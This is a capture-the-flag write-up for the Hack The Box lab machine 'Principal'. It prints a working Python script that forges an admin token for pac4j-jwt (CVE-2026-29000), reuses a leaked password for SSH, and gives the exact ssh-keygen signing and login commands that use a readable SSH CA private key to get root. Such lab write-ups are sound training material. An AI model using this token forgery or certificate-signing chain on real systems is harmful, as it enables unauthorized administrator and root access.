# Principal
#HTB #medium #adventure-mode #CVE #JWT #Web #authentication #SSH #privilege-escalation #burp-suite #remote-access 
## Target:
*Name:* Principal

*IP:* 10.129.89.130
## Vulnerability:
- **CVE-2026-29000:** The outdated `pac4j-jwt` version allowed authentication token forgery and administrator impersonation.
- The application's settings page exposed the `encryptionKey`, which was reused as the SSH password for the `svc-deploy` account.
- Improper permissions on an SSH Certificate Authority private key. Members of the `deployers` group could read the private CA key trusted by `sshd`, allowing the creation of trusted SSH certificates.
## Steps:
#### 1) Reconnaissance

**Code:**
```
nmap -p- 10.129.89.130
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-28 15:08 -0400
Nmap scan report for 10.129.89.130
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 19.38 seconds
```

Only two services were identified on the target machine:
- SSH running on port 22
- HTTP running on port 8080
#### 2) Investigating the web application

**Screenshot:**

<img width="2558" height="1339" alt="image" src="https://github.com/user-attachments/assets/6a433c6b-0ea5-4cb8-b498-dcded6646279" />

We noticed an important information, the web application is powered by pac4j which is known for multiple CVE vulnerabilities.
Using Burp Suite, we identified the exact version of `pac4j` used in the response HTTP header:
```
X-Powered-By: pac4j-jwt/6.0.3
```

And Burp Suite exposed a hidden request from the browser to `/api/auth/jwk`, which returned the server's RSA public key in JSON Web Key (JWK) format:
```http
HTTP/1.1 200 OK
Date: Fri, 28 Aug 2026 18:48:50 GMT
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
Content-Type: application/json
Content-Length: 402
```
```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
    }
  ]
}
```
#### 3) CVE-2026-29000
A critical authentication bypass in the Java security library pac4j-jwt allows attackers to impersonate any user, including administrators, using nothing more than a server's RSA public key. The vulnerability, tracked as `CVE-2026-29000`, carries a CVSS 10.0 score and affects all versions of `org.pac4j:pac4j-jwt` prior to 4.5.9, 5.7.9, and 6.3.3, which means 6.0.3 is also vulnerable to it.

**Source:** [CVE-2026-29000](https://snyk.io/fr/articles/public-key-breaks-authentication-pac4j-jwt/)

#### 4) Exploiting the vulnerability
Next, we used a python script to generate a valid token:
```python
from jwcrypto import jwk, jwe  
import time  
import base64  
  
RSA_public_key = jwk.JWK.from_json(  
    '{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
    }
  ]
}'  
)  
  
  
header = base64.urlsafe_b64encode(b'{"alg":"none"}').decode()  
  
payload = base64.urlsafe_b64encode(  
    f'{{"sub":"admin","role":"ROLE_ADMIN", "exp":{int(time.time()) + 3600}}}'.encode()  
).decode()  
  
info = f"{header}.{payload}."  
  
token = jwe.JWE(  
    info.encode(),  
    protected={  
        "alg": "RSA-OAEP-256",  
        "enc": "A256GCM",  
    }  
)  
  
token.add_recipient(RSA_public_key)  
  
print(token.serialize(compact=True))
```
**Result:**
```
eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJlbmMiOiJBMjU2R0NNIn0.QorTXTYWURb_86oplREeNuWqO6vCifUrKiB71L3xwG1Dryy3HcnpM8Hfr0V29negQ_l1JkJdIAVDT5nFu-u2XX8FOc3ZV22xc95_g_vUKz24v4di9aUPBob_9c3gM_3Xqa5hDboV0AlrmS6xyTaOUPYgN_EHd4yKa5-5Kge5sFPXVunNMpWFJnaEqd9-36PlWGY0Ti2xKAJiJoRRmQ6QTR7Yib1wlRDb6VGyWI9mp0Na3zj52470x8x1inz4O7lcRYti1i-4lOoz-z2R4OBOCl4BRm__JPy12q2mLBwLOBrS71xdhAxZjQJLjo-M9OWeYg4Gctv5N3PI1bwAI-_uQg.vQ9OkIdsotbZejmp.VGdRf3iChsWzTSnCdMS2Pnh-i4nGgaFo16iobWECijfF5RZHeLoWO6Hs-Vctl1ZA38aKmeR8_6E5bG0-IlCrsyyd5XT8mKoged0-UJKsNnHcgGlN-f2gibRUWrN-jA.eqHm8ZbSU_FBiK2wF_-fAg
```
**Explanation:**
The script retrieves the server's RSA public key in JWK format and uses it to create a JWE. 
First, an unsigned PlainJWT is constructed by Base64URL-encoding a JWT header with `alg: none` and a payload containing the forged claims. 
The resulting `header.payload.` token is then used as the plaintext of a JWE. The JWE encrypts this PlainJWT using the server's RSA public key, with `RSA-OAEP-256` for key management and `A256GCM` for content encryption. 
Finally, the JWE is serialized in compact format so it can be sent as a Bearer token in the `Authorization` header.

We stored the resulting token in the browser's storage as `auth_token` and refreshed the page.
**Result:**

<img width="2465" height="1283" alt="image" src="https://github.com/user-attachments/assets/99630025-476c-4e92-b7ef-0971a640745c" />

#### 5) Further investigation on the web application
We discovered that the user `svc-deploy` had recently obtained an SSH certificate.:

<img width="1730" height="82" alt="image" src="https://github.com/user-attachments/assets/e44db35a-35c1-42c4-be12-9753ac3fe682" />

The settings page exposed an `encryptionKey` containing the value `Depl0y_$$H_Now42!`. This credential could be reused as the password for the `svc-deploy` user to authenticate via SSH.

<img width="2023" height="522" alt="image" src="https://github.com/user-attachments/assets/bcc47ff3-0805-46bb-b5d7-aae2b4376b93" />

We tried to authenticate to the machine via SSH using the credentials we found:
```
┌──(____________)-[~]
└─$ ssh svc-deploy@10.129.89.130                  
svc-deploy@10.129.89.130's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
svc-deploy@principal:~$
```

Finally, we searched for user flag:
```
svc-deploy@principal:~$ ls
user.txt
svc-deploy@principal:~$ cat user.txt
<USER_FLAG>
```

#### 6) Privilege escalation
We started by checking the privileges of the `svc-deploy` user with `sudo -l`. However, the user did not have any sudo privileges:
```
svc-deploy@principal:~$ sudo -l
[sudo] password for svc-deploy: 
Sorry, user svc-deploy may not run sudo on principal.
```
Next, we examined the user’s identity and group memberships using the `id` command:
```
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```
It appears that the user belongs to the `deployers` group. We then checked the file permissions associated with this group:
```
svc-deploy@principal:~$ find / -group deployers -ls 2>/dev/null
      547      4 -rw-r-----   1 root     deployers      168 Mar 10 14:35 /etc/ssh/sshd_config.d/60-principal.conf
    20398      4 drwxr-x---   2 root     deployers     4096 Mar 11 04:22 /opt/principal/ssh
    20498      4 -rw-r-----   1 root     deployers      288 Mar  5 21:05 /opt/principal/ssh/README.txt
    20499      4 -rw-r-----   1 root     deployers     3381 Mar  5 21:05 /opt/principal/ssh/ca
```
**/etc/ssh/sshd_config.d/60-principal.conf**
```
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```
**/opt/principal/ssh/ca**
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAupcTUsyUBVNyv9BSynItQWa/hy9VE0OOcvJ85btLVWghXJbhGWcj
7t8IAuF2whpooZvMMqAYCVyOgWckU6Ys5hyWQIzZr4vZ3FKEtOkaZfqAL/BNxroHXEKIJU
----------------------------------------------------------------------
-----------------------------<REDACTED>-------------------------------
----------------------------------------------------------------------
fS7OH8nBT9CD2hRkaPcckFBID8WpXvyCG7cgYH2NTJzCB0wWf14obrty37uj7PvtatiqZF
avZUzxb6uPQ2VQ/XgBtIB3Ik+PysDfJFKYkiJ934bG2MD78qDGFWIpFqhjlQK+6K8kXNfW
3m+NdOR8xTkAAAAQcHJpbmNpcGFsLXNzaC1jYQECAw==
-----END OPENSSH PRIVATE KEY-----
```

We discovered:
```
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

This configuration tells the SSH server:
```
 Trust SSH user certificates that are signed by the CA corresponding to /opt/principal/ssh/ca.pub.
```
Then we have access to:
```
/opt/principal/ssh/ca
```
which is the **private key of that CA**.

The process is:

```
CA private key (ca)
        │
        │ signs
        ▼
your public key (user_key.pub)
        │
        ▼
SSH certificate (user_key-cert.pub)
        │
        │ presented during SSH login
        ▼
       sshd
        │
        │ checks certificate signature
        ▼
Is it signed by the CA whose public key
is listed in TrustedUserCAKeys?
        │
       YES
        ▼
Certificate is trusted
```

Our next step was to generate a new SSH key pair and have the trusted CA sign our public key, creating a valid SSH certificate for authentication.
**Generating the SSH key pair:**
```
ssh-keygen -t rsa -f user_key -N ''
```
**Changing the permissions for CA:**
```
chmod 600 ca
```

> [!NOTE] 
> We tried to sign the key pair directly but the operation failed because the permissions for 'ca' were too open.

**Signing the key:**
```
ssh-keygen -s ca -I htb -n root -V +1h user_key.pub
```

**Using the signed key:**
```
ssh -i user_key -o CertificateFile=user_key-cert.pub root@10.129.89.130
```

**Result:**
```
root@principal:~#
```

Finally, we successfully authenticated to the server as `root` using the signed SSH certificate, gaining root access to the system, and to the flag.

```
root@principal:~# cat root.txt
<ROOT_FLAG>
```
## Flag:
[Not disclosed — solve it yourself!]
## Key takeaway:
- Outdated versions of applications/services can have critical publicly known vulnerabilities.
- Sensitive credentials should never be stored or exposed in plaintext.
- Group permissions should be carefully configured according to the principle of least privilege.
- SSH Certificate Authority private keys must be protected like other high-value credentials because they can be used to issue trusted authentication certificates.
